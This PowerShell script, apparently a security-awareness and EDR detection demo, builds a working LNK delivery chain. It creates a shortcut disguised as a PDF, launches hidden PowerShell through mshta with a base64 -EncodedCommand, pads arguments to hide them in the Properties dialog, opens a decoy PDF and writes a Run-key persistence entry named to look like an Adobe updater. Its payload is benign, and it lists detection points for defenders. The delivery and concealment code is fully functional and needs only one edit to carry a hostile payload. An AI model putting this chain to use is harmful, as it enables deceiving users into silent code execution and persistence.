#Requires -Version 5.1
<#
.SYNOPSIS
    Security Demo: LNK-based APT Delivery + Persistence Simulation

.DESCRIPTION
    Demonstrates real-world LNK attack techniques used by APT groups (DPRK, APT36, Gamaredon).
    ALL PAYLOADS ARE BENIGN — designed for ENS/EDR detection demonstrations.

    Techniques demonstrated:
      - PDF icon spoofing  (LNK displays as PDF to victim)
      - Extension hiding   (.lnk hidden by Windows Explorer by default)
      - ZDI-CAN-25373 style  whitespace padding to hide args in Properties dialog
      - Silent execution   mshta.exe (LOLBin) -> VBScript window=0 -> PowerShell hidden
      - Decoy document     real PDF opens to distract victim, masking attack
      - HKCU Run key       persistence survives reboot (benign entry)
      - Execution log      writes evidence to %TEMP% for demo proof

    Artifacts created:
      Desktop  : <DocName>.pdf.lnk         the weaponised shortcut
      %TEMP%   : <DocName>.pdf             decoy document opened on victim
      %TEMP%   : demo_execution_log.txt    written when LNK executes (proof)
      Registry : HKCU\...\Run\<PersistKey> benign persistence (notepad.exe)

    ENS/EDR detection points:
      [!] mshta.exe spawning powershell.exe              (suspicious parent-child)
      [!] powershell.exe -WindowStyle Hidden -EncodedCommand
      [!] Registry Run key write from mshta process tree
      [!] LNK target = mshta.exe (unusual for shortcuts)

.PARAMETER OutputDir
    Directory to place the LNK. Default: Desktop.

.PARAMETER DocName
    Base name for LNK file and decoy PDF. Shown to victim as the filename.

.PARAMETER PersistKey
    Registry value name under HKCU Run. Chosen to look like a legitimate update task.

.PARAMETER PadArguments
    Add whitespace padding before arguments (simulates ZDI-CAN-25373 technique).
    Hides command from Windows Properties dialog — visible only via hex editor / Sysmon.

.EXAMPLE
    .\New-LNKDemo.ps1
    Creates Q3_Financial_Report_2024.pdf.lnk on the Desktop.

.EXAMPLE
    .\New-LNKDemo.ps1 -DocName "Invoice_Nov_2024" -PadArguments
    Creates padded LNK simulating the whitespace-hiding zero-day.

.NOTES
    Run .\Remove-LNKDemo.ps1 after demo to remove all artifacts.
    AUTHORISED SECURITY DEMO USE ONLY.
#>
[CmdletBinding()]
param(
    [string] $OutputDir  = "$env:USERPROFILE\Desktop",
    [string] $DocName    = "Q3_Financial_Report_2024",
    [string] $PersistKey = "AdobeAcrobat_Update",   # looks like a legit updater
    [switch] $PadArguments                           # ZDI-CAN-25373 whitespace demo
)

$ErrorActionPreference = 'Stop'
Set-StrictMode -Version Latest

# ─── Paths ────────────────────────────────────────────────────────────────────
$lnkPath    = Join-Path $OutputDir "$DocName.pdf.lnk"
$decoyPath  = Join-Path $env:TEMP  "$DocName.pdf"
$logPath    = Join-Path $env:TEMP  "demo_execution_log.txt"
$regRunPath = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'

# Ensure output directory exists
if (-not (Test-Path $OutputDir)) {
    New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
    Write-Host "    Created output dir: $OutputDir" -ForegroundColor DarkGray
}

# ─── Banner ───────────────────────────────────────────────────────────────────
Write-Host ""
Write-Host "  +---------------------------------------------------------+" -ForegroundColor Cyan
Write-Host "  |   LNK Delivery Demo  --  Security Awareness Lab        |" -ForegroundColor Cyan
Write-Host "  |   BENIGN PAYLOAD  |  ENS / EDR Detection Demo          |" -ForegroundColor Cyan
Write-Host "  +---------------------------------------------------------+" -ForegroundColor Cyan
Write-Host ""

# ═════════════════════════════════════════════════════════════════════════════
# STEP 1 — Create a valid decoy PDF
# ═════════════════════════════════════════════════════════════════════════════
Write-Host "[1/4] Building decoy PDF..." -ForegroundColor Yellow

function New-DecoyPDF {
    param([string]$FilePath, [string]$Title)

    # Use a MemoryStream so we can track exact byte offsets for the xref table.
    # PDF spec requires xref offsets to be byte-accurate.
    $enc = [Text.Encoding]::ASCII
    $ms  = [IO.MemoryStream]::new()

    function Append-Line ([string]$s) {
        $b = $enc.GetBytes($s + "`r`n")
        $ms.Write($b, 0, $b.Length)
    }
    function Append-Raw ([byte[]]$b) {
        $ms.Write($b, 0, $b.Length)
    }

    # PDF header
    Append-Line "%PDF-1.4"

    # Track object byte offsets
    $off = @{}

    # Object 1 — Catalog
    $off[1] = [int]$ms.Length
    Append-Line "1 0 obj"
    Append-Line "<< /Type /Catalog /Pages 2 0 R >>"
    Append-Line "endobj"

    # Object 2 — Pages
    $off[2] = [int]$ms.Length
    Append-Line "2 0 obj"
    Append-Line "<< /Type /Pages /Kids [ 3 0 R ] /Count 1 >>"
    Append-Line "endobj"

    # Object 3 — Page
    $off[3] = [int]$ms.Length
    Append-Line "3 0 obj"
    Append-Line "<< /Type /Page /Parent 2 0 R /MediaBox [ 0 0 612 792 ]"
    Append-Line "   /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> >> >>"
    Append-Line "   /Contents 4 0 R >>"
    Append-Line "endobj"

    # Object 4 — Content stream
    $pageLines = @(
        "BT",
        "/F1 22 Tf",
        "72 720 Td",
        "($Title) Tj",
        "/F1 10 Tf",
        "0 -28 Td",
        "(CONFIDENTIAL - For Internal Use Only) Tj",
        "0 -16 Td",
        "(Prepared by: Finance & Strategy Department) Tj",
        "0 -16 Td",
        "(Distribution: Senior Leadership) Tj",
        "0 -32 Td",
        "/F1 8 Tf",
        "(This document is a Security Awareness Demo artifact. No real data is contained herein.) Tj",
        "ET"
    )
    $pageContent = $pageLines -join "`r`n"
    $contentBytes = $enc.GetBytes($pageContent)

    $off[4] = [int]$ms.Length
    Append-Line "4 0 obj"
    Append-Line "<< /Length $($contentBytes.Length) >>"
    Append-Line "stream"
    Append-Raw $contentBytes
    Append-Line ""
    Append-Line "endstream"
    Append-Line "endobj"

    # Cross-reference table
    $xrefOffset = [int]$ms.Length
    Append-Line "xref"
    Append-Line "0 5"
    Append-Line "0000000000 65535 f "   # trailing space required by spec
    1..4 | ForEach-Object { Append-Line ("{0:D10} 00000 n " -f $off[$_]) }

    # Trailer
    Append-Line "trailer"
    Append-Line "<< /Size 5 /Root 1 0 R >>"
    Append-Line "startxref"
    Append-Line "$xrefOffset"
    Append-Line "%%EOF"

    [IO.File]::WriteAllBytes($FilePath, $ms.ToArray())
    $ms.Dispose()
}

New-DecoyPDF -FilePath $decoyPath -Title $DocName.Replace('_', ' ')
Write-Host "    -> $decoyPath" -ForegroundColor DarkGray

# ═════════════════════════════════════════════════════════════════════════════
# STEP 2 — Resolve PDF application icon from registry
# ═════════════════════════════════════════════════════════════════════════════
Write-Host "[2/4] Resolving PDF icon (spoofing surface)..." -ForegroundColor Yellow

function Get-PDFIconPath {
    # Primary: read default handler icon from HKCR / HKCU registry
    foreach ($hive in @('HKCU:\SOFTWARE\Classes', 'HKLM:\SOFTWARE\Classes')) {
        try {
            $progId = (Get-ItemProperty "$hive\.pdf" -EA Stop).'(default)'
            if ($progId) {
                $icon = (Get-ItemProperty "$hive\$progId\DefaultIcon" -EA Stop).'(default)'
                if ($icon -and (Test-Path ($icon -split ',')[0])) { return $icon }
            }
        } catch {}
    }
    # Fallback: known PDF reader executables
    $candidates = @(
        "$env:ProgramFiles\Adobe\Acrobat DC\Acrobat\Acrobat.exe,0",
        "${env:ProgramFiles(x86)}\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe,0",
        "$env:ProgramFiles\Adobe\Acrobat Reader DC\Reader\AcroRd32.exe,0",
        "${env:ProgramFiles(x86)}\Adobe\Reader 11.0\Reader\AcroRd32.exe,0",
        # Edge handles PDF on Win10/11 if Adobe not installed
        "$env:ProgramFiles\Microsoft\Edge\Application\msedge.exe,13",
        "${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe,13"
    )
    foreach ($c in $candidates) {
        if (Test-Path ($c -split ',')[0]) { return $c }
    }
    # Last resort: generic document icon from imageres.dll
    return "$env:SystemRoot\System32\imageres.dll,66"
}

$pdfIcon = Get-PDFIconPath
Write-Host "    -> $pdfIcon" -ForegroundColor DarkGray

# ═════════════════════════════════════════════════════════════════════════════
# STEP 3 — Build the silent payload (runs when victim double-clicks LNK)
# ═════════════════════════════════════════════════════════════════════════════
Write-Host "[3/4] Building and encoding embedded payload..." -ForegroundColor Yellow

# Payload is kept compact so the base64 stays well under WScript.Shell's
# practical ~2047-char limit for LNK Arguments on modern Windows.
#
# Variables WITHOUT backtick  → interpolated at BUILD time (paths baked in)
# Variables WITH backtick     → escaped, run at EXECUTION time inside the LNK

$payloadPS = @"
Start-Process '$decoyPath'
Set-ItemProperty -Path '$regRunPath' -Name '$PersistKey' -Value 'C:\Windows\notepad.exe' -Force
`$ts = Get-Date -f 'yyyy-MM-dd HH:mm:ss'
@(
    '[DEMO] LNK Payload Executed',
    "Time   : `$ts",
    "Host   : `$env:COMPUTERNAME",
    "User   : `$env:USERDOMAIN\`$env:USERNAME",
    "PID    : `$PID (powershell.exe -WindowStyle Hidden)",
    "Chain  : LNK -> mshta.exe -> vbscript -> WScript.Shell.Run(0) -> PS -EncodedCommand",
    "",
    "Techniques: PDF icon spoof | Ext hide | mshta LOLBin | HKCU Run persist | Decoy doc",
    "BENIGN DEMO -- ALL PAYLOADS SAFE"
) -join [Environment]::NewLine | Out-File '$logPath' -Encoding UTF8 -Force
"@

# UTF-16LE + Base64 — the exact encoding powershell.exe -EncodedCommand expects
$payloadB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payloadPS))

Write-Host "    Payload : $($payloadPS.Length) chars" -ForegroundColor DarkGray
Write-Host "    Encoded : $($payloadB64.Length) chars (fits inside single LNK)" -ForegroundColor DarkGray

# ═════════════════════════════════════════════════════════════════════════════
# STEP 4 — Build LNK arguments (mshta silent execution technique)
# ═════════════════════════════════════════════════════════════════════════════
Write-Host "[4/4] Assembling LNK file..." -ForegroundColor Yellow

# ── Technique: mshta inline VBScript with WScript.Shell.Run(cmd, 0, False)
#    Window style 0 = vbHide — process starts completely invisible.
#    No cmd.exe flash, no PowerShell window, nothing visible to victim.
#    Documented APT usage: APT36, Lazarus, Gamaredon, QakBot.
#
#    The full PS command + base64 becomes the Run argument — no file dropped,
#    no network touch. Single LNK contains the entire attack.
$psCmd     = "powershell.exe -WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $payloadB64"
$vbsInline = 'vbscript:Execute("CreateObject(""WScript.Shell"").Run ""' + $psCmd + '"",0,False:close")'

# ── Technique: ZDI-CAN-25373 whitespace padding (optional)
#    Prepend null-equivalent whitespace so the Properties dialog shows nothing.
#    Real attacks used HT(0x09), LF(0x0A), VT(0x0B), FF(0x0C), CR(0x0D).
#    Purely cosmetic for this demo — does not change execution behaviour.
if ($PadArguments) {
    $padding    = "`t" * 50    # 50 horizontal tabs push visible text off-screen
    $vbsInline  = $padding + $vbsInline
    Write-Host "    ZDI-CAN-25373 whitespace padding applied (Properties dialog will appear empty)" -ForegroundColor Magenta
}

# ── Create the LNK via WScript.Shell COM object
$wsh      = New-Object -ComObject WScript.Shell
$lnk      = $wsh.CreateShortcut($lnkPath)

$lnk.TargetPath       = "$env:SystemRoot\System32\mshta.exe"
$lnk.Arguments        = $vbsInline
$lnk.WorkingDirectory = "$env:SystemRoot\System32"
$lnk.WindowStyle      = 7          # SW_SHOWMINNOACTIVE — start minimised/invisible
$lnk.IconLocation     = $pdfIcon   # victim sees PDF icon
$lnk.Description      = $DocName.Replace('_', ' ')   # tooltip text

$lnk.Save()
[Runtime.InteropServices.Marshal]::ReleaseComObject($wsh) | Out-Null

$lnkSize = (Get-Item $lnkPath).Length
Write-Host "    LNK  : $lnkPath  ($lnkSize bytes)" -ForegroundColor DarkGray
Write-Host "    Target: mshta.exe  (LOLBin — legitimate Windows binary)" -ForegroundColor DarkGray

# ═════════════════════════════════════════════════════════════════════════════
# Summary
# ═════════════════════════════════════════════════════════════════════════════
Write-Host ""
Write-Host "[+] Done. Demo artifacts ready." -ForegroundColor Green
Write-Host ""
Write-Host "  Artifacts" -ForegroundColor White
Write-Host "  ---------" -ForegroundColor DarkGray
Write-Host "  LNK (victim opens this) : $lnkPath" -ForegroundColor Cyan
Write-Host "  Decoy PDF               : $decoyPath" -ForegroundColor Gray
Write-Host "  Execution log           : $logPath  (written when LNK runs)" -ForegroundColor Gray
Write-Host "  Persistence             : HKCU\...\Run\$PersistKey  (written when LNK runs)" -ForegroundColor Gray
Write-Host "  Payload                 : embedded in LNK as Base64 -EncodedCommand  (no extra files)" -ForegroundColor Gray
Write-Host ""
Write-Host "  Attack Chain (victim perspective)" -ForegroundColor White
Write-Host "  ----------------------------------" -ForegroundColor DarkGray
Write-Host "  1. Victim sees '$DocName.pdf' on Desktop with PDF icon" -ForegroundColor Gray
Write-Host "  2. Victim double-clicks it" -ForegroundColor Gray
Write-Host "  3. Windows launches mshta.exe (LOLBin, signed by Microsoft)" -ForegroundColor Gray
Write-Host "  4. mshta executes inline VBScript, WScript.Shell.Run(window=0)" -ForegroundColor Gray
Write-Host "  5. PowerShell -WindowStyle Hidden -EncodedCommand <base64> runs silently" -ForegroundColor Gray
Write-Host "  6. Decoy PDF opens in foreground -- victim sees normal document" -ForegroundColor Gray
Write-Host "  7. Persistence written to HKCU Run (survives reboot)" -ForegroundColor Gray
Write-Host "  8. Execution log written to %TEMP% as evidence" -ForegroundColor Gray
Write-Host "  => At no point does the victim see a cmd or PowerShell window" -ForegroundColor DarkGray
Write-Host ""
Write-Host "  ENS Detection Opportunities" -ForegroundColor White
Write-Host "  ----------------------------" -ForegroundColor DarkGray
Write-Host "  [!] mshta.exe -> powershell.exe parent-child (HIPS / Expert Rules)" -ForegroundColor Red
Write-Host "  [!] PowerShell -WindowStyle Hidden -EncodedCommand (obfuscated payload in cmdline)" -ForegroundColor Red
Write-Host "  [!] Registry Run key write from mshta.exe process tree" -ForegroundColor Red
Write-Host "  [!] LNK TargetPath = mshta.exe (atypical shortcut target)" -ForegroundColor Red
if ($PadArguments) {
Write-Host "  [!] LNK argument field starts with excessive whitespace (ZDI-CAN-25373)" -ForegroundColor Red
}
Write-Host ""
Write-Host "  Cleanup" -ForegroundColor White
Write-Host "  -------" -ForegroundColor DarkGray
Write-Host "  Run: .\Remove-LNKDemo.ps1  (same -DocName / -PersistKey flags if you used custom values)" -ForegroundColor Yellow
Write-Host ""
